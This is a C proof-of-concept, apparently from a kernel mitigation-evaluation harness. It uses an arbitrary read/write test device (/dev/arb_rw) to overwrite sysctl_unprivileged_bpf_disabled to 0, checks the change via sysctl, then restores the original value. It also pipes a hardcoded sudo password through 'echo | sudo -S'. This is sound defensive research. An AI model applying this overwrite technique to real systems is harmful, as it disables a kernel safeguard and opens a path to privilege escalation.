// FZY: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define FIELD_SIZE 4

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// sysctl only ever allows raising this knob, so the arbitrary write is also
// what makes an exact restore possible.
static unsigned int orig_unprivileged_bpf_disabled;

void verify_sysctl_unprivileged_bpf_disabled_addr(int fd, unsigned long sysctl_unprivileged_bpf_disabled_addr) {
  printf("[+] sysctl_unprivileged_bpf_disabled address: 0x%lx\n", sysctl_unprivileged_bpf_disabled_addr);

  // Get the current value
  unsigned int current_value;
  arb_read(fd, sysctl_unprivileged_bpf_disabled_addr, &current_value, FIELD_SIZE);
  printf("[+] Current sysctl_unprivileged_bpf_disabled value: %u\n", current_value);
  orig_unprivileged_bpf_disabled = current_value;
}

void restore_sysctl_unprivileged_bpf_disabled(int fd, unsigned long sysctl_unprivileged_bpf_disabled_addr) {
  unsigned int readback;

  arb_write(fd, sysctl_unprivileged_bpf_disabled_addr,
            &orig_unprivileged_bpf_disabled, FIELD_SIZE);
  arb_read(fd, sysctl_unprivileged_bpf_disabled_addr, &readback, FIELD_SIZE);
  if (readback == orig_unprivileged_bpf_disabled)
    printf("[+] sysctl_unprivileged_bpf_disabled restored to %u\n",
           orig_unprivileged_bpf_disabled);
  else
    printf("[-] sysctl_unprivileged_bpf_disabled restore failed, now: %u\n", readback);
}

void overwrite_sysctl_unprivileged_bpf_disabled(int fd, unsigned long sysctl_unprivileged_bpf_disabled_addr) {
  printf("[+] Overwriting sysctl_unprivileged_bpf_disabled at 0x%lx\n", sysctl_unprivileged_bpf_disabled_addr);

  // Unprivileged users can load eBPF programs
  unsigned int new_value = 0;
  printf("[+] Writing value %u to address 0x%lx\n", new_value, sysctl_unprivileged_bpf_disabled_addr);
  arb_write(fd, sysctl_unprivileged_bpf_disabled_addr, &new_value, FIELD_SIZE);
  printf("[+] Write completed\n");
  
  unsigned int verify_value;
  arb_read(fd, sysctl_unprivileged_bpf_disabled_addr, &verify_value, FIELD_SIZE);
  printf("[+] New sysctl_unprivileged_bpf_disabled value after write: %u\n", verify_value);

  if (verify_value != new_value) {
    printf("[-] WARNING: Write verification failed! Expected %u but got %u\n", 
           new_value, verify_value);
  } else {
    printf("[+] sysctl_unprivileged_bpf_disabled successfully overwritten to %u!\n", new_value);
  }
}

// Query the knob the way a user would, with sysctl.
int query_sysctl(char *buf, size_t len) {
  FILE *fp;

  memset(buf, 0, len);

  // Use sh -c to properly pipe the password to sudo
  fp = popen("sh -c 'echo debian | sudo -S sysctl kernel.unprivileged_bpf_disabled 2>/dev/null'", "r");
  if (!fp) {
      printf("[-] Failed to execute popen\n");
      return -1;
  }

  if (fgets(buf, len, fp) == NULL) {
      printf("[-] Failed to read from pipe\n");
      pclose(fp);
      return -1;
  }

  pclose(fp);

  // Safely null-terminate the string
  buf[len - 1] = '\0';

  // Remove newline if present
  size_t n = strlen(buf);
  if (n > 0 && buf[n - 1] == '\n') {
      buf[n - 1] = '\0';
  }

  return 0;
}

static char sysctl_before[128];

// What sysctl reports before the overwrite, for the before/after comparison.
void snapshot_sysctl(void) {
  printf("[+] Querying kernel.unprivileged_bpf_disabled via sysctl before the overwrite\n");
  if (query_sysctl(sysctl_before, sizeof(sysctl_before)) < 0) {
    strcpy(sysctl_before, "(unreadable)");
    return;
  }
  printf("[+] Output: %s\n", sysctl_before);
}

void verify_exploit() {
  printf("[+] Checking if exploit worked...\n");

  printf("[+] Current sysctl_unprivileged_bpf_disabled value from sysfs:\n");

  char buf[128];

  if (query_sysctl(buf, sizeof(buf)) < 0)
      return;

  printf("[+] Output: %s\n", buf);
  printf("[+] sysctl before -> after: '%s' -> '%s'\n", sysctl_before, buf);

  if (strcmp(buf, "kernel.unprivileged_bpf_disabled = 0") == 0) {
      printf("[+] SUCCESS: unprivileged_bpf_disabled is 0 now, unprivileged users can load eBPF programs\n");
  } else {
      printf("[-] Output does not match expected value\n");
  }
  return;
}

int main(int argc, char *argv[]) {
  printf("[+] Privilege escalation PoC by overwriting sysctl_unprivileged_bpf_disabled\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <sysctl_unprivileged_bpf_disabled_addr>\n", argv[0]);
    printf("\t- mode: 0 for no protection, 1 for Sensitivity Tag, "
           "2 for Sensitivity and TypeID Tag.\n");
    printf("\t- sysctl_unprivileged_bpf_disabled_addr: nm vmlinux | grep sysctl_unprivileged_bpf_disabled\n");
    return 1;
  }

  printf("[+] Opening /dev/arb_rw...\n");

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open");
    exit(1);
  }

  printf("[+] Device opened successfully\n");
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("Invalid mode. Use 0 for no protection, "
      "1 for protection with Sensitivity Tag, "
      "and 2 for protection with Sensitivity and TypeID Tag.\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long sysctl_unprivileged_bpf_disabled_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    // Get the address of sysctl_unprivileged_bpf_disabled from the kernel with arb_read, because we store the address of sysctl_unprivileged_bpf_disabled in the global variable and store the string content at unpredictable address
    arb_read(arbrw_dev_fd, sysctl_unprivileged_bpf_disabled_addr, &sysctl_unprivileged_bpf_disabled_addr, sizeof(unsigned long));

    printf("[+] sysctl_unprivileged_bpf_disabled address from kernel memory: 0x%lx\n", sysctl_unprivileged_bpf_disabled_addr);

    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // sysctl_unprivileged_bpf_disabled_addr = sysctl_unprivileged_bpf_disabled_addr | 0xFFFF000000000000;
  }
  
  verify_sysctl_unprivileged_bpf_disabled_addr(arbrw_dev_fd, sysctl_unprivileged_bpf_disabled_addr);

  snapshot_sysctl();

  overwrite_sysctl_unprivileged_bpf_disabled(arbrw_dev_fd, sysctl_unprivileged_bpf_disabled_addr);

  verify_exploit();

  restore_sysctl_unprivileged_bpf_disabled(arbrw_dev_fd, sysctl_unprivileged_bpf_disabled_addr);

  close(arbrw_dev_fd);
  
  return 0;
}